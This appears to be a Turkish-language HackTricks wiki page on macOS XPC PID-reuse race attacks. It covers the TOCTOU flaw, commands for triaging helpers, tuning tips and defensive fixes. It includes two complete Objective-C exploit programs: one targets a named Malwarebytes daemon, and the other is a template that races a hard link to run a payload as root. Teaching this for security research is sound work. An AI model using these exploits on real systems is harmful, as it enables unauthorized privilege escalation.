# macOS PID Reuse

{{#include ../../../../../../banners/hacktricks-training.md}}

## PID Reuse

Bir macOS **XPC service**, alınan mesajla ilişkilendirilmiş kimlik bilgilerini kullanmak yerine bir çağıranı **PID** değerini çözümleyerek doğruladığında PID reuse saldırısına karşı savunmasız olabilir. Pratik primitive, PID namespace'in sarılmasını beklemek değildir: saldırgan bir XPC isteği gönderir ve hemen ardından **`posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ)`** çağrısını **`POSIX_SPAWN_SETEXEC`** ile yaparak, PID'yi korurken saldırganın process image'ını **allowed binary** ile değiştirir.<sup>[[1]](#references)[[2]](#references)</sup>

Sunucu isteği kuyruktan çıkarır ve ancak bundan sonra code-signing, entitlement, path veya parent-process kontrolleri için bu sayısal PID'yi canlı bir process'e çözümlerse, mesajı gönderen process yerine replacement binary'yi görür. `POSIX_SPAWN_START_SUSPENDED`, sunucu kontrolü gerçekleştirirken trusted replacement'ın canlı ve kararlı kalmasını sağlar.<sup>[[1]](#references)[[2]](#references)</sup>

### Gerçekte ne yarış durumuna giriyor

Savunmasız sıra, yalnızca “PID'ler tekrar edebilir” durumu değil, bir **message-identity TOCTOU** durumudur:<sup>[[1]](#references)[[2]](#references)</sup>

1. Bir attacker process, bir XPC connection oluşturur veya devam ettirir ve privileged request'i kuyruğa alır.
2. Service, connection'ın PID'sini `SecCodeRef` veya başka bir process object'e dönüştürmeden önce attacker, `POSIX_SPAWN_SETEXEC` kullanarak aynı process'i approved executable ile overlay eder.
3. Service, o anda PID'ye bağlı approved image'ı doğrular ve ardından önceden kuyruğa alınmış attacker-controlled request'i dispatch eder.

Bir authorization data flow içindeki her PID bridge şüphelidir: `-[NSXPCConnection processIdentifier]`, `xpc_connection_get_pid` veya `audit_token_to_pid` çağrılarının ardından `SecCodeCopyGuestWithAttributes`/`kSecGuestAttributePid`, `proc_pidpath`, `NSRunningApplication(processIdentifier:)` ya da custom signature verifier kullanılması. Yalnızca logging için kullanılan bir PID yeterli değildir; allow/deny kararına ulaştığını doğrulayın. Ayrıca error path'lerini de inceleyin: önce audit-token lookup denenmesi ancak **failure durumunda PID'ye fallback yapılması** aynı race'i yeniden oluşturur. Bu fallback pattern'i, Intego'nun privileged XPC services'inin 2026 tarihli bir analizinde görülmüştür.<sup>[[3]](#references)</sup>

### Fast static and dynamic triage

Connection handler'dan başlayın ve her PID-producing call'ın code-signing, entitlement, executable-path veya version kontrollerine giden akışını izleyin. Bu komutlar, aday bir helper üzerinde hızlı bir ilk inceleme sağlar; stripped binary'ler de çoğunlukla imported symbol'leri, Objective-C selector'larını veya diagnostic string'lerini korur:<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
```bash
BIN="/path/to/privileged/helper"
nm -um "$BIN" 2>/dev/null | rg 'xpc_connection_get_pid|SecCodeCopyGuestWithAttributes'
otool -ov "$BIN" 2>/dev/null | rg 'processIdentifier|auditToken|setCodeSigningRequirement'
strings -a "$BIN" | rg -i 'guest.*pid|signature.*pid|process identifier|audit token|peer.*requirement'
```
Kontrollü bir test sırasında hem PID kaynağını hem de doğrulayıcısını kırın veya hook'layın. `xpc_connection_get_pid` ya da `-processIdentifier` üzerindeki bir yakalama yalnızca bir ipucudur; yararlı kanıt, istek alındıktan sonra **aynı integer** değerinin daha sonra aranmasıdır. Frida ayrıca, PID race kazandığında selector'ün çalışıp çalışmadığını ölçmek için uygulamaya özgü doğrulayıcıyı ve privileged selector'ü hook'layabilir.<sup>[[3]](#references)</sup>

### Exploit örneği

**`shouldAcceptNewConnection`** fonksiyonunu veya onun çağırdığı ve **`processIdentifier`** çağrısı yapan, ancak **`auditToken`** çağrısı yapmayan bir fonksiyonu bulursanız, bu büyük olasılıkla **audit token** yerine **process PID** değerini doğruladığı anlamına gelir.\
Örneğin, referanstan alınan şu görselde olduğu gibi:<sup>[[1]](#references)</sup>

<figure><img src="../../../../../../images/image (306).png" alt="https://wojciechregula.blog/images/2020/04/pid.png"><figcaption></figcaption></figure>

Exploit'in 2 kısmını görmek için bu exploit örneğini inceleyin (yine referanstan alınmıştır):<sup>[[1]](#references)</sup>

- Birden fazla fork **oluşturan**
- **Her fork**, mesajı gönderdikten hemen sonra **`posix_spawn`** çalıştırırken **payload**'ı XPC service'e **gönderecek**

> [!CAUTION]
> Objective-C process'inden `fork()` ile race gerçekleştirirken exploit'i `OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES` export edilmiş olarak başlatın veya `__objc_fork_ok` marker'ını ekleyin:
>
> ```objectivec
> asm(".section __DATA,__objc_fork_ok\n"
> "empty:\n"
> ".no_dead_strip empty\n");
> ```

{{#tabs}}
{{#tab name="NSTasks"}}
**NSTasks** ve çocukları başlatarak RC'yi exploit etmek için kullanılan argümanı kullanan ilk seçenek
```objectivec
// Code from https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/
// gcc -framework Foundation expl.m -o expl

#import <Foundation/Foundation.h>
#include <spawn.h>
#include <sys/stat.h>

#define RACE_COUNT 32
#define MACH_SERVICE @"com.malwarebytes.mbam.rtprotection.daemon"
#define BINARY "/Library/Application Support/Malwarebytes/MBAM/Engine.bundle/Contents/PlugIns/RTProtectionDaemon.app/Contents/MacOS/RTProtectionDaemon"

// allow fork() between exec()
asm(".section __DATA,__objc_fork_ok\n"
"empty:\n"
".no_dead_strip empty\n");

extern char **environ;

// defining necessary protocols
@protocol ProtectionService
- (void)startDatabaseUpdate;
- (void)restoreApplicationLauncherWithCompletion:(void (^)(BOOL))arg1;
- (void)uninstallProduct;
- (void)installProductUpdate;
- (void)startProductUpdateWith:(NSUUID *)arg1 forceInstall:(BOOL)arg2;
- (void)buildPurchaseSiteURLWithCompletion:(void (^)(long long, NSString *))arg1;
- (void)triggerLicenseRelatedChecks;
- (void)buildRenewalLinkWith:(NSUUID *)arg1 completion:(void (^)(long long, NSString *))arg2;
- (void)cancelTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)startTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)unredeemLicenseKeyWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)applyLicenseWith:(NSUUID *)arg1 key:(NSString *)arg2 completion:(void (^)(long long))arg3;
- (void)controlProtectionWithRawFeatures:(long long)arg1 rawOperation:(long long)arg2;
- (void)restartOS;
- (void)resumeScanJob;
- (void)pauseScanJob;
- (void)stopScanJob;
- (void)startScanJob;
- (void)disposeOperationBy:(NSUUID *)arg1;
- (void)subscribeTo:(long long)arg1;
- (void)pingWithTag:(NSUUID *)arg1 completion:(void (^)(NSUUID *, long long))arg2;
@end

void child() {

// send the XPC messages
NSXPCInterface *remoteInterface = [NSXPCInterface interfaceWithProtocol:@protocol(ProtectionService)];
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:MACH_SERVICE options:NSXPCConnectionPrivileged];
xpcConnection.remoteObjectInterface = remoteInterface;

[xpcConnection resume];
[xpcConnection.remoteObjectProxy restartOS];

char target_binary[] = BINARY;
char *target_argv[] = {target_binary, NULL};
posix_spawnattr_t attr;
posix_spawnattr_init(&attr);
short flags;
posix_spawnattr_getflags(&attr, &flags);
flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
posix_spawnattr_setflags(&attr, flags);
posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

bool create_nstasks() {

NSString *exec = [[NSBundle mainBundle] executablePath];
NSTask *processes[RACE_COUNT];

for (int i = 0; i < RACE_COUNT; i++) {
processes[i] = [NSTask launchedTaskWithLaunchPath:exec arguments:@[ @"imanstask" ]];
}

int i = 0;
struct timespec ts = {
.tv_sec = 0,
.tv_nsec = 500 * 1000000,
};

nanosleep(&ts, NULL);
if (++i > 4) {
for (int i = 0; i < RACE_COUNT; i++) {
[processes[i] terminate];
}
return false;
}

return true;
}

int main(int argc, const char * argv[]) {

if(argc > 1) {
// called from the NSTasks
child();

} else {
NSLog(@"Starting the race");
create_nstasks();
}

return 0;
}
```
{{#endtab}}

{{#tab name="fork"}}
Bu örnek, **PID race condition**'dan yararlanacak **child process**'leri başlatmak için raw **`fork`** kullanır ve ardından **Hard link** aracılığıyla başka bir race condition'dan yararlanır:
```objectivec
// export OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES
// gcc -framework Foundation expl.m -o expl

#include <Foundation/Foundation.h>
#include <spawn.h>
#include <pthread.h>

// TODO: CHANGE PROTOCOL AND FUNCTIONS
@protocol HelperProtocol
- (void)DoSomething:(void (^)(_Bool))arg1;
@end

// Global flag to track exploitation status
bool pwned = false;

/**
* Continuously overwrite the contents of the 'hard_link' file in a race condition to make the
* XPC service verify the legit binary and then execute as root out payload.
*/
void *check_race(void *arg) {
while(!pwned) {
// Overwrite with contents of the legit binary
system("cat ./legit_bin > hard_link");
usleep(50000);

// Overwrite with contents of the payload to execute
// TODO: COMPILE YOUR OWN PAYLOAD BIN
system("cat ./payload > hard_link");
usleep(50000);
}
return NULL;
}

void child_xpc_pid_rc_abuse(){
// TODO: INDICATE A VALID BIN TO BYPASS SIGN VERIFICATION
#define kValid "./Legit Updater.app/Contents/MacOS/Legit"
extern char **environ;

// Connect with XPC service
// TODO: CHANGE THE ID OF THE XPC TO EXPLOIT
NSString*  service_name = @"com.example.Helper";
NSXPCConnection* connection = [[NSXPCConnection alloc] initWithMachServiceName:service_name options:0x1000];
// TODO: CNAGE THE PROTOCOL NAME
NSXPCInterface* interface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperProtocol)];
[connection setRemoteObjectInterface:interface];
[connection resume];

id obj = [connection remoteObjectProxyWithErrorHandler:^(NSError* error) {
NSLog(@"[-] Something went wrong");
NSLog(@"[-] Error: %@", error);
}];

NSLog(@"obj: %@", obj);
NSLog(@"conn: %@", connection);

// Call vulenrable XPC function
// TODO: CHANGE NAME OF FUNCTION TO CALL
[obj DoSomething:^(_Bool b){
NSLog(@"Response, %hdd", b);
}];

// Change current process to the legit binary suspended
char target_binary[] = kValid;
char *target_argv[] = {target_binary, NULL};
posix_spawnattr_t attr;
posix_spawnattr_init(&attr);
short flags;
posix_spawnattr_getflags(&attr, &flags);
flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
posix_spawnattr_setflags(&attr, flags);
posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

/**
* Function to perform the PID race condition using children calling the XPC exploit.
*/
void xpc_pid_rc_abuse() {
#define RACE_COUNT 1
extern char **environ;
int pids[RACE_COUNT];

// Fork child processes to exploit
for (int i = 0; i < RACE_COUNT; i++) {
int pid = fork();
if (pid == 0) {  // If a child process
child_xpc_pid_rc_abuse();
}
printf("forked %d\n", pid);
pids[i] = pid;
}

// Wait for children to finish their tasks
sleep(3);

// Terminate child processes
for (int i = 0; i < RACE_COUNT; i++) {
if (pids[i]) {
kill(pids[i], 9);
}
}
}

int main(int argc, const char * argv[]) {
// Create and set execution rights to 'hard_link' file
system("touch hard_link");
system("chmod +x hard_link");

// Create thread to exploit sign verification RC
pthread_t thread;
pthread_create(&thread, NULL, check_race, NULL);

while(!pwned) {
// Try creating 'download' directory, ignore errors
system("mkdir download 2>/dev/null");

// Create a hardlink
// TODO: CHANGE NAME OF FILE FOR SIGN VERIF RC
system("ln hard_link download/legit_bin");

xpc_pid_rc_abuse();
usleep(10000);

// The payload will generate this file if exploitation is successful
if (access("/tmp/pwned", F_OK ) == 0) {
pwned = true;
}
}

return 0;
}
```
{{#endtab}}
{{#endtabs}}

## Yarışı tekrarlanabilir hâle getirme

Aşağıdaki ayarlama noktaları, çalışan PID-reuse exploit'lerinde ve yakın zamanda gerçekleştirilen privileged-helper testlerinde tekrar tekrar görülür:<sup>[[1]](#references)[[3]](#references)</sup>

- İsteği gönderin ve `posix_spawn` çağrısını hemen yapın; yanıttan **beklemeyin**. Sunucunun PID lookup işlemi image replacement sonrasında gerçekleşirken istek zaten kuyruğa alınmış olmalıdır.
- `POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED` seçeneklerini birlikte kullanın. İlk flag, yarışan process'in PID'sini korur; ikinci flag ise doğrulamadan önce geçerli target'ın çıkmasını veya durumunu değiştirmesini engeller.
- Birden fazla kısa ömürlü racer kullanın ve connection/request/exec sequence'in tamamını yeniden deneyin. En uygun sayı target'a bağlıdır; aşırı sayıda child service'i yavaşlatabilir ve window'u daha kötü hâle getirebilir.
- Replacement, sunucunun **tüm** gereksinimini karşılamalıdır. Mümkün olduğunda legitimate client binary'sini yeniden kullanın ve önce designated requirement'ını `codesign -d -r- "/path/to/client.app"` ile kontrol edin.
- Önce zararsız bir exported selector veya read-only method çağırın. Bu, authentication'ı kazanmayı daha sonra kullanılan privileged primitive'i başarıyla exploit etmekten ayırır.

## PID bridge'den kaçınma

macOS 13+ sürümlerinde Foundation, `-[NSXPCConnection setCodeSigningRequirement:]` özelliğini sunar. Peer requirement'ı tam olarak bir kez ve `resume` işleminden **önce** ayarlayın; hatalı requirement string'leri bir exception (veya Swift fatal error) oluşturur ve requirement'ı karşılamayan bir peer'den gelen mesaj connection'ı geçersiz kılar. Bu, XPC'nin peer'in code identity'sini application code'un bir PID çözümlemesine gerek kalmadan enforce etmesini sağlar.<sup>[[6]](#references)</sup>
```objectivec
- (BOOL)listener:(NSXPCListener *)l shouldAcceptNewConnection:(NSXPCConnection *)c {
@try {
NSString *req = @"anchor apple generic and identifier \"com.example.client\" "
@"and certificate leaf[subject.OU] = \"TEAMID\"";
[c setCodeSigningRequirement:req];
} @catch (NSException *e) {
return NO;
}
c.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(Helper)];
c.exportedObject = self;
[c resume];
return YES;
}
```
macOS 26+ için modern low-level listener API'de `xpc_listener_set_peer_requirement`, listener inactive durumdayken doğrulanmış bir `xpc_peer_requirement_t` uygular. XPC, bu gereksinimi karşılamayan istekleri düşürür; listener tarafından oluşturulan peer session'lar bunu **devralmaz**, bu nedenle bu session'lar privileged işlemleri authorize ederken uygun bir session requirement da uygulayın.<sup>[[7]](#references)</sup>

> [!WARNING]
> Bunu, bir audit token'ı kopyalayıp gerçek `SecCode` lookup işlemi için tekrar PID'ye dönüştürerek “düzeltmeyin”. Authorization kararı boyunca audit token'dan türetilen identity'yi koruyun veya baştan sona bir XPC peer-requirement API kullanın.<sup>[[2]](#references)[[6]](#references)</sup> Connection-wide audit-token API'leri de [macOS xpc_connection_get_audit_token Attack](macos-xpc_connection_get_audit_token-attack.md) bölümünde ele alınan farklı bir race class'a sahiptir.

## Diğer örnekler

- [**Intego X9: macOS antivirus yazılımınız neden PID'lere güvenmemeli**](https://blog.quarkslab.com/intego_lpe_macos_2.html) - Client'ları PID ile authenticate eden bir AV'nin privileged helper'ına karşı LPE.<sup>[[3]](#references)</sup>
- [**GOG Galaxy XPC service'ını macOS'ta privilege escalation için Exploiting**](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)<sup>[[4]](#references)</sup>
- [**Rootpipe Reborn (Part II)**](https://objective-see.org/blog/blog_0x41.html)<sup>[[5]](#references)</sup>



## References

- [1] [XPC exploitation öğrenin - Part 2: PID'e hayır deyin!](https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/)
- [2] [PID'e güvenmeyin! Basit bir logic bug hikayeleri ve onu nerede bulacağınız - Samuel Groß (WarCon 2018)](https://saelo.github.io/presentations/warcon18_dont_trust_the_pid.pdf)
- [3] [Intego X9: macOS antivirus yazılımınız neden PID'lere güvenmemeli](https://blog.quarkslab.com/intego_lpe_macos_2.html)
- [4] [GOG Galaxy XPC service'ını macOS'ta privilege escalation için Exploiting](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)
- [5] [Rootpipe Reborn (Part II)](https://objective-see.org/blog/blog_0x41.html)
- [6] [Apple Developer — `NSXPCConnection.setCodeSigningRequirement`](https://developer.apple.com/documentation/foundation/nsxpcconnection/setcodesigningrequirement(_:))
- [7] [Apple Developer — `xpc_listener_set_peer_requirement`](https://developer.apple.com/documentation/xpc/xpc_listener_set_peer_requirement)
{{#include ../../../../../../banners/hacktricks-training.md}}
